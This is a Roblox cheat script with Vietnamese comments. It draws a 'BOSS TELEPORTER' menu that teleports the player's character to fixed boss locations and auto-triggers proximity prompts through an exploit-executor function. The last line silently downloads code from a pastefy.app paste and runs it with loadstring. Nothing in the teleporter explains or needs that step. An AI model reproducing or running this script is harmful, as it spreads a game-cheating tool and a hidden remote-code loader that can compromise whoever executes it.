local Players = game:GetService("Players")
local ProximityPromptService = game:GetService("ProximityPromptService")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Cấu hình tự động tương tác
local instantInteractEnabled = true

ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt, player)
    if instantInteractEnabled then
        fireproximityprompt(prompt)
    end
end)


local BOSS_DATA = {
    ["Goblin"] = {
        position = Vector3.new(945, 35, -40376),
        color = Color3.fromRGB(0, 128, 0),      -- Xanh lá cây
        textColor = Color3.fromRGB(255, 255, 255)
    },
    ["Điểm xuất phát"] = {
        position = Vector3.new(22, 11, -40001),
        color = Color3.fromRGB(100, 100, 100),  -- Xám
        textColor = Color3.fromRGB(255, 255, 255)
    },
    ["Samurai"] = {
        position = Vector3.new(-198, 38, -3561),
        color = Color3.fromRGB(220, 20, 60),    -- Đỏ đậm
        textColor = Color3.fromRGB(255, 255, 255)
    },
    ["Vam"] = {
        position = Vector3.new(114, 54, 5126),
        color = Color3.fromRGB(75, 0, 130),     -- Tím
        textColor = Color3.fromRGB(255, 255, 255)
    },
    ["Steampunk"] = {
        position = Vector3.new(-7, 91, 26997),
        color = Color3.fromRGB(210, 180, 140),  -- Nâu vàng
        textColor = Color3.fromRGB(0, 0, 0)
    },
    ["Người lùn"] = {
        position = Vector3.new(353, 51, 16077),
        color = Color3.fromRGB(139, 69, 19),    -- Nâu đất
        textColor = Color3.fromRGB(255, 255, 255)
    },
    ["Đảo sky"] = {
        position = Vector3.new(-395, 355, 34959),
        color = Color3.fromRGB(135, 206, 235),  -- Xanh da trời nhạt
        textColor = Color3.fromRGB(0, 0, 0)
    },
    ["Vua băng"] = {
        position = Vector3.new(-5, 35, 46465),
        color = Color3.fromRGB(173, 216, 230),  -- Xanh băng
        textColor = Color3.fromRGB(0, 0, 0)
    }
}

-- Tạo GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BossTeleporter"
screenGui.ResetOnSpawn = false

-- Frame chính (có thể di chuyển) - Dùng ImageLabel
local mainFrame = Instance.new("ImageLabel")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 220, 0, 320)
mainFrame.Position = UDim2.new(0, 50, 0, 50)
mainFrame.Image = "rbxassetid://11437654695"
mainFrame.ScaleType = Enum.ScaleType.Stretch
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Selectable = true
mainFrame.Parent = screenGui

-- Thanh tiêu đề
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Size = UDim2.new(0.7, 0, 1, 0)
titleText.Position = UDim2.new(0.05, 0, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "BOSS TELEPORTER"
titleText.TextColor3 = Color3.fromRGB(0, 0, 0)
titleText.Font = Enum.Font.GothamBold
titleText.TextSize = 16
titleText.Parent = titleBar

-- Nút đóng/mở GUI (toggle button)
local toggleButton = Instance.new("TextButton")
toggleButton.Name = "ToggleButton"
toggleButton.Size = UDim2.new(0, 100, 0, 30)
toggleButton.Position = UDim2.new(0.5, -50, 0, 40)
toggleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.BorderSizePixel = 1
toggleButton.BorderColor3 = Color3.fromRGB(200, 200, 200)
toggleButton.Text = "Ẩn GUI"
toggleButton.TextColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.Font = Enum.Font.Gotham
toggleButton.TextSize = 13
toggleButton.Parent = mainFrame

-- Hiển thị trạng thái auto-interact
local autoInteractLabel = Instance.new("TextLabel")
autoInteractLabel.Name = "AutoInteractLabel"
autoInteractLabel.Size = UDim2.new(1, -20, 0, 20)
autoInteractLabel.Position = UDim2.new(0, 10, 0, 75)
autoInteractLabel.BackgroundTransparency = 1
autoInteractLabel.Text = "Mua đồ nhanh: Bật"
autoInteractLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
autoInteractLabel.Font = Enum.Font.Gotham
autoInteractLabel.TextSize = 12
autoInteractLabel.TextXAlignment = Enum.TextXAlignment.Center
autoInteractLabel.Parent = mainFrame

-- Nút toggle auto-interact
local toggleAutoButton = Instance.new("TextButton")
toggleAutoButton.Name = "Tự động"
toggleAutoButton.Size = UDim2.new(0, 120, 0, 25)
toggleAutoButton.Position = UDim2.new(0.5, -60, 0, 100)
toggleAutoButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
toggleAutoButton.BorderSizePixel = 1
toggleAutoButton.BorderColor3 = Color3.fromRGB(200, 200, 200)
toggleAutoButton.Text = "Tắt mua đồ nhanh"
toggleAutoButton.TextColor3 = Color3.fromRGB(0, 0, 0)
toggleAutoButton.Font = Enum.Font.Gotham
toggleAutoButton.TextSize = 12
toggleAutoButton.Parent = mainFrame

-- Danh sách các nút teleport
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name = "ScrollFrame"
scrollFrame.Size = UDim2.new(1, -10, 0, 140)
scrollFrame.Position = UDim2.new(0, 5, 0, 130)
scrollFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scrollFrame.BackgroundTransparency = 0.2
scrollFrame.BorderSizePixel = 1
scrollFrame.BorderColor3 = Color3.fromRGB(200, 200, 200)
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(200, 200, 200)
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.Parent = mainFrame

local buttonHeight = 32
local padding = 4

-- Tạo nút cho từng boss
local buttonCount = 0
for bossName, bossInfo in pairs(BOSS_DATA) do
    local teleButton = Instance.new("TextButton")
    teleButton.Name = bossName .. "Button"
    teleButton.Size = UDim2.new(1, -10, 0, buttonHeight)
    teleButton.Position = UDim2.new(0, 5, 0, (buttonHeight + padding) * buttonCount)
    
    -- Màu nền theo boss
    teleButton.BackgroundColor3 = bossInfo.color
    teleButton.BorderSizePixel = 1
    teleButton.BorderColor3 = bossInfo.color:lerp(Color3.new(0, 0, 0), 0.3) -- Viền tối hơn
    
    -- Màu chữ
    teleButton.Text = bossName
    teleButton.TextColor3 = bossInfo.textColor
    teleButton.Font = Enum.Font.GothamMedium
    teleButton.TextSize = 13
    teleButton.Parent = scrollFrame
    
    -- Hiệu ứng hover
    teleButton.MouseEnter:Connect(function()
        teleButton.BackgroundColor3 = bossInfo.color:lerp(Color3.new(1, 1, 1), 0.2)
    end)
    
    teleButton.MouseLeave:Connect(function()
        teleButton.BackgroundColor3 = bossInfo.color
    end)
    
    -- Sự kiện click teleport
    teleButton.MouseButton1Click:Connect(function()
        if character and humanoidRootPart then
            -- Thêm hiệu ứng teleport
            teleButton.Text = "Đang teleport..."
            teleButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- Màu vàng khi teleport
            
            -- Teleport
            humanoidRootPart.CFrame = CFrame.new(bossInfo.position)
            
            -- Khôi phục nút sau 0.5s
            task.wait(0.5)
            teleButton.Text = bossName
            teleButton.BackgroundColor3 = bossInfo.color
        end
    end)
    
    buttonCount = buttonCount + 1
end

-- Cập nhật kích thước canvas
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, (buttonHeight + padding) * buttonCount)

-- Nút mini trên màn hình khi GUI ẩn - Dùng ImageButton
local miniButton = Instance.new("ImageButton")
miniButton.Name = "MiniButton"
miniButton.Size = UDim2.new(0, 60, 0, 60)
miniButton.Position = UDim2.new(0, 10, 0.5, -30)
miniButton.Image = "rbxassetid://11437654695"
miniButton.ScaleType = Enum.ScaleType.Stretch
miniButton.BackgroundTransparency = 1
miniButton.BorderSizePixel = 2
miniButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
miniButton.Visible = false
miniButton.Active = true
miniButton.Draggable = true
miniButton.Selectable = true
miniButton.Parent = screenGui

-- Thêm TextLabel để hiện chữ "Mở GUI" trên nút mini
local miniButtonText = Instance.new("TextLabel")
miniButtonText.Size = UDim2.new(1, 0, 1, 0)
miniButtonText.BackgroundTransparency = 1
miniButtonText.Text = "Mở\nGUI"
miniButtonText.TextColor3 = Color3.fromRGB(0, 0, 0)
miniButtonText.Font = Enum.Font.Gotham
miniButtonText.TextSize = 11
miniButtonText.TextWrapped = true
miniButtonText.Parent = miniButton

-- Biến trạng thái
local isGUIVisible = true

-- Hàm toggle GUI
local function toggleGUI()
    isGUIVisible = not isGUIVisible
    mainFrame.Visible = isGUIVisible
    miniButton.Visible = not isGUIVisible
    
    if isGUIVisible then
        toggleButton.Text = "Ẩn GUI"
    else
        toggleButton.Text = "Hiện GUI"
    end
end

-- Hàm toggle auto-interact
local function toggleAutoInteract()
    instantInteractEnabled = not instantInteractEnabled
    
    if instantInteractEnabled then
        autoInteractLabel.Text = "Mua đồ nhanh: Bật"
        autoInteractLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        toggleAutoButton.Text = "Tắt mua đồ nhanh"
        print("Mua đồ nhanh: Bật")
    else
        autoInteractLabel.Text = "Mua đồ nhanh: Tắt"
        autoInteractLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
        toggleAutoButton.Text = "Bật mua đồ nhanh"
        print("Mua đồ nhanh: Tắt")
    end
end

-- Kết nối sự kiện nút
toggleButton.MouseButton1Click:Connect(toggleGUI)
miniButton.MouseButton1Click:Connect(toggleGUI)
toggleAutoButton.MouseButton1Click:Connect(toggleAutoInteract)

-- Thêm GUI vào màn hình
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Hiệu ứng khi mở GUI
task.spawn(function()
    mainFrame.ImageTransparency = 1
    for i = 0, 1, 0.1 do
        mainFrame.ImageTransparency = 1 - i
        task.wait(0.01)
    end
end)

loadstring(game:HttpGet("https://pastefy.app/C99C6KXA/raw"))()
